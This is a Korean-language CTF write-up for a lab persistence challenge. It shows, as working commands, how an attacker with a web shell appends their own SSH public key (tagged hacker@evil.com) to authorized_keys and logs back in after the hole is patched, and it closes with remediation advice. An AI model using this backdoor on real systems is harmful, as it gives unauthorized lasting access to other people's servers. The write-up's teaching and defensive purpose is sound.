+++
title = "VulnABLE CTF [LUXORA] Write-up: Persistence 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Persistence", "Bronze", "SSH Keys", "Backdoor", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Persistence 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Advanced Layer (Persistence)
- **난이도**: 🥉 Bronze
- **타겟 경로**: 시스템 쉘 내부 (웹 쉘 등에서 시작)
- **목표**: 일시적으로 획득한 서버의 쉘(Shell) 권한을 활용하여, 웹 서버가 재부팅되거나 기존 취약점이 패치되더라도 언제든지 다시 접속할 수 있도록 **영구적인 백도어(Persistence)**를 설치하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 목표 설정 (Reconnaissance)

이전 챌린지(웹 쉘 업로드, RCE 등)를 통해 서버의 `www-data` 또는 일반 유저 권한의 쉘(Shell)을 얻었다고 가정합니다.

**[해커의 사고 과정]**
1. 웹 쉘은 관리자가 `uploads` 폴더를 청소하거나 취약한 코드를 패치하면 영원히 날아간다.
2. 비밀번호를 탈취해서 들어왔다면, 관리자가 비밀번호를 바꾸는 순간 접속이 끊긴다.
3. 따라서 내가 마음대로 접속할 수 있는 '나만의 뒷문'을 만들어야 한다.
4. 리눅스 시스템에서 가장 고전적이고 확실한 방법은 **내 공개키(Public Key)를 서버의 인가된 키(Authorized Keys) 목록에 몰래 추가하는 것**이다!

---

## 💥 2. 취약점 식별 및 SSH 공개키 등록 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Web Shell ] --(Write to ~/.ssh/authorized_keys)--> [ Host OS ]
[ Attacker ]  --(SSH Login with Private Key)-------> [ Host OS ]
                                                     |-- Permanent Access!
```


리눅스의 SSH 서비스는 비밀번호 대신 비대칭 키(RSA, Ed25519 등)를 사용한 로그인을 지원합니다. 사용자의 `~/.ssh/authorized_keys` 파일에 등록된 공개키를 가진 사람은 언제든지 비밀번호 없이 해당 계정으로 로그인할 수 있습니다.

### 💡 Step 1: 해커 로컬 PC에서 SSH 키쌍 생성
해커의 터미널에서 새로운 키쌍을 생성합니다.
```bash
$ ssh-keygen -t ed25519 -f ./hacker_key -N ""
```
생성된 `hacker_key.pub` (공개키)의 내용을 복사합니다.
```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... hacker@evil.com
```

### 💡 Step 2: 타겟 서버에 공개키 주입
획득한 타겟 서버의 웹 쉘 창에서, 현재 유저(`www-data` 또는 일반 유저)의 `.ssh` 디렉터리를 만들고 키를 꽂아 넣습니다.

```bash
# 1. 홈 디렉터리로 이동
$ cd ~
# 2. .ssh 디렉터리가 없으면 생성 및 권한 부여
$ mkdir -p .ssh
$ chmod 700 .ssh
# 3. 해커의 공개키를 authorized_keys 파일 맨 끝에 추가 (echo >>)
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... hacker@evil.com" >> .ssh/authorized_keys
# 4. 키 파일 권한 엄격하게 설정 (필수)
$ chmod 600 .ssh/authorized_keys
```

---

## 🚀 3. 공격 수행 및 영구 접속 확인

이제 타겟 서버의 웹 취약점이 완벽하게 패치되어 웹 쉘이 삭제되었다고 가정해 봅시다. 해커는 더 이상 웹을 통해 명령어를 내릴 수 없습니다.

### 🔍 백도어(SSH)를 통한 재접속
해커의 터미널에서 방금 만든 개인키(`hacker_key`)를 들고 타겟 서버의 22번 포트로 당당하게 접속합니다.

```bash
$ ssh -i ./hacker_key www-data@luxora-target-server.com
```

### 🔍 접속 성공
비밀번호를 물어보지도 않고, 즉시 쉘이 떨어집니다! 웹 취약점이 패치되었음에도 해커는 언제든 이 서버에 마음대로 들락거릴 수 있게 되었습니다.

```text
Welcome to Ubuntu 22.04 LTS
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ cat /flag_persistence_bronze.txt
FLAG{PERSIST_🥉_SSH_AUTHORIZED_KEYS_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

초기 침투(Initial Access) 성공 후, 방어자의 눈을 피해 시스템의 기본 인증 메커니즘(`authorized_keys`)에 자신을 등록하여 영구적인 통제권(Persistence)을 확보하는 APT의 기본 전술을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{PERSIST_🥉_SSH_AUTHORIZED_KEYS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 문제는 소프트웨어의 버그라기보다는 침해 사고 발생 후의 **시스템 모니터링(Monitoring) 및 파일 무결성 관리** 부재에 기인합니다.

* **안전한 패치 가이드 (무결성 모니터링 및 권한 제어)**
1. **FIM (File Integrity Monitoring) 도입**: `OSSEC`, `Wazuh`, `AIDE` 같은 파일 무결성 모니터링 도구를 설치하여, 시스템의 중요한 설정 파일(`.ssh/authorized_keys`, `/etc/passwd`, `/etc/shadow`)이 변경되는 즉시 보안팀에 알람이 가도록 해야 합니다.
2. **서비스 계정(Service Account)의 SSH 로그인 차단**: `www-data`, `nginx`, `mysql` 같은 서비스 구동용 계정은 쉘 접속이 아예 필요 없습니다. `/etc/passwd` 파일에서 이들의 로그인 쉘을 `/bin/bash` 에서 `/usr/sbin/nologin` 이나 `/bin/false` 로 변경해야 합니다. 이렇게 하면 키를 등록하더라도 SSH 접속 자체가 거부됩니다.
3. **정기적인 키 로테이션 및 감사**: 서버 관리자는 주기적으로 각 계정의 `authorized_keys` 파일을 열어 출처를 알 수 없거나 퇴사한 직원의 공개키가 남아있는지 감사(Audit)해야 합니다.